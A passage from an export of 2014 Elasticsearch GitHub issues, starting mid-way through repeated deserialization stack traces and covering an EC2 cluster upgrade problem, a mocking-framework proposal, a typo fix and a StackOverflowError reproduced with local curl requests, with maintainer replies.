    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:08,057][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:08,057][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:08,060][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:08,062][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:08,143][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more

```
</description><key id="41356675">7491</key><summary>java.lang.IndexOutOfBoundsException: Readable byte limit exceeded</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nai0om</reporter><labels><label>feedback_needed</label></labels><created>2014-08-28T05:32:17Z</created><updated>2014-11-14T18:25:00Z</updated><resolved>2014-11-14T18:25:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T13:04:29Z" id="54711715">@spinscale do you have any idea what's going on here?
</comment><comment author="spinscale" created="2014-09-06T13:56:37Z" id="54712898">@clintongormley @nai0om wild guess here: maybe you hit #5357

Have you configured thread pools to be unbounded? Can you change them to be bounded or test with 1.2.4 and see if this still occurs?

Does this error have any effect on your cluster operation-wise?
</comment><comment author="clintongormley" created="2014-11-14T18:25:00Z" id="63107275">No more feedback - I'm guessing this has been solved.  Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>After Upgrade 1.3.1 to 1.3.2 then Can't find master node(1.3.1) on AWS EC2 with multicast</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7490</link><project id="" key="" /><description>Hi 
When I upgraded Elasticsearch cluster 1.3.1 to 1.3.2, and restarting node by node, 
But when i restarted first node, it could't find existing master node, and became a master node by self. So I restart that node several times, but it still couldn't find existing master node which is previous version of ES(1.3.1).
So It parted from the cluster and make new cluster with same name.
After all other nodes restarted. all nodes joined new version of ES cluster. 

It means, when I upgrade Elasticsearch cluster which using multicast on AWS EC2, I should stop the service  and restart all nodes. Is it right?

My Env
- AWS EC2 
- 6 data nodes (master is 3 node only)
- multicast

Content of `/etc/elasticsearch/elasticsearch.yml`:

```
cluster.name: MyCluster
node.name: "Node1"
node.master: true
node.data: true
node.zone: eu-west-1a 
cluster.routing.allocation.awareness.force.zone.values: eu-west-1a,eu-west-1b,eu-                                                                                                                                                                                               west-1c
cluster.routing.allocation.awareness.attributes: zone
# Node1 - zone:eu-west-1a - master&amp;data &lt;= first restart for upgrade node
# Node2 - zone:eu-west-1a - data only
# Node3 - zone:eu-west-1b - master&amp;data &lt;= current master node 1.3.1
# Node4 - zone:eu-west-1b - data only
# Node5 - zone:eu-west-1c - master&amp;data
# Node6 - zone:eu-west-1c - data only

discovery.zen.ping.multicast.enabled: true
cloud:
    aws:
        access_key: Key
        secret_key: Key
        region: eu-west-1
discovery:
    type: ec2
```

Thanks.

Daniel
</description><key id="41355479">7490</key><summary>After Upgrade 1.3.1 to 1.3.2 then Can't find master node(1.3.1) on AWS EC2 with multicast</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">groge</reporter><labels><label>feedback_needed</label></labels><created>2014-08-28T04:56:50Z</created><updated>2014-09-22T19:39:30Z</updated><resolved>2014-09-22T19:39:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-01T10:09:32Z" id="54042734">A first idea is that you don't have to set `discovery.zen.ping.multicast.enabled: true` because aws plugin is using unicast behind the scene.
It builds a list of IP addresses using AWS API and then create the unicast list of nodes.

As a first try, could you remove that line and restart?

Wondering also about that line:

```
cluster.routing.allocation.awareness.force.zone.values: eu-west-1a,eu-west-1b,eu-                                                                                                                                                                                               west-1c
```

I guess it was a bad copy and paste and should be:

```
cluster.routing.allocation.awareness.force.zone.values: eu-west-1a,eu-west-1b,eu-west-1c
```

Right?
</comment><comment author="dadoonet" created="2014-09-22T19:39:30Z" id="56428698">No answer on this. Closing. Feel free to reopen and add more details when you have it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add mocking framework? </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7489</link><project id="" key="" /><description>Hi,

I am new, and maybe it's just my lack of knowledge.

But wouldn't it be easier to create unit tests with a mocking framework like easymock or mockito.

I am trying to test this `parse` function, for #7408.

``` java
public class FieldValueFactorFunctionParser implements ScoreFunctionParser {
    public static String[] NAMES = { "field_value_factor", "fieldValueFactor" };

    @Override
    public ScoreFunction parse(QueryParseContext parseContext, XContentParser parser) throws IOException, QueryParsingException {
```

But to do that I need to create a valid `QueryParseContext` and also a `XContentParser`. The mock would allow me to focus on the method logic instead of spending time trying to figure out how to get those 2 objects, which I don't care very much about at this point in time (maybe after in the dev I will. But not right now at the start of my wanna be task).
</description><key id="41352045">7489</key><summary>Add mocking framework? </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">cfontes</reporter><labels /><created>2014-08-28T03:18:09Z</created><updated>2014-11-07T10:43:22Z</updated><resolved>2014-11-07T10:30:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-11-07T10:30:05Z" id="62124626">We discussed this and came to the conclusion that this is mainly addressed with `ElasticsearchSingleNodeTest.java` in the test framework. The majority of us are in favor of not adding a mock framework for several reasons mainly related to the mess they tend to create. I am closing this as `won't fix`
</comment><comment author="cfontes" created="2014-11-07T10:43:22Z" id="62125989">Thanks for the answer!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Spelling error of aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7488</link><project id="" key="" /><description>A typo while writting
</description><key id="41351299">7488</key><summary>Spelling error of aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">londocr</reporter><labels /><created>2014-08-28T02:58:02Z</created><updated>2014-08-28T06:57:51Z</updated><resolved>2014-08-28T06:57:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-28T06:57:51Z" id="53680287">Thx @londocr . I pulled it in: da7760017857bbc73acf3547ecd862851759ccfc
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>StackOverflowError running query script and agg script</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7487</link><project id="" key="" /><description>This query was generated by a benchmarking framework that creates random combinations of clauses and this combo of scripted agg and script_score that references "_score" causes a StackOverflowError

```
curl -XPUT "http://localhost:9200/test?pretty=true" -d'
{
  "mappings": {
    "car": {
      "properties": {
        "make": {
          "type": "string",
          "index": "not_analyzed"
        },
        "model": {
          "type": "string",
          "index": "not_analyzed"
        },
        "mileage": {
          "type": "integer"
        }
      }
    }
  }
}'
curl -XPOST "http://localhost:9200/test/car/1?pretty=true" -d'
{
  "make": "bmw",
  "model": "m3",
  "mileage": 30000
}'  
curl -XPOST "http://localhost:9200/test/car/_search?pretty" -d'
{
   "query": {
      "function_score": {
         "query": {
            "term": {
               "model": "m3"
            }
         },
         "script_score": {
            "script": "_score * doc[\"mileage\"].value "
         },
         "boost_mode": "replace"
      }
   },
   "aggs": {
      "makes": {
         "terms": {
            "script": "doc[\"make\"].value"
         }
      }
   }
}'  
```
</description><key id="41327962">7487</key><summary>StackOverflowError running query script and agg script</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T20:37:06Z</created><updated>2014-09-26T08:00:46Z</updated><resolved>2014-09-26T08:00:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-10T08:03:28Z" id="55083171">So this is caused by the following: 

